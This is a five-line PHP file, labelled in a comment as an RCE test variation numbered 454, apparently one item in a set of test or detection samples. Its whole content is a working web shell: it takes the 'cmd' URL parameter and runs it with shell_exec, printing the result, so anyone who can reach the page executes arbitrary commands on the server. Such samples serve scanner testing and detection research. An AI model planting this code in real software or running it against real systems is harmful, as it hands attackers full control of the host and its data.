<?php
// RCE test variation #454
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>